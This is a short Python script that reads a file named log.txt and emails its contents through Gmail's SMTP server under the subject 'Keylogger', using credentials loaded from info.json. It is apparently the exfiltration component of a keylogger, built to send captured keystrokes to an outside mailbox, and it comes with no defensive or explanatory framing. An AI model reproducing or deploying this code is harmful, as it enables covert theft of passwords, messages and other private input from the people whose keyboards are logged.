import email
import ssl
import smtplib
import json

# Define your email parameters
sender = ""
password = ""
receiver = ""
subject = "Keylogger"
body = ""

# Get the contents of log.txt
with open("log.txt", "r") as txtFile:
    body = txtFile.read()

# Extract data from .json file
with open("info.json", "r") as jsonFile:
    data = json.load(jsonFile)
    sender = data["sender"]
    password = data["password"]
    receiver = data["receiver"]

# Fill email info
em = email.message.EmailMessage()
em['From'] = sender
em['To'] = receiver
em['Subject'] = subject
em.set_content(body)

context = ssl.create_default_context()

with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
    smtp.login(sender, password)
    smtp.sendmail(sender, sender, em.as_string())
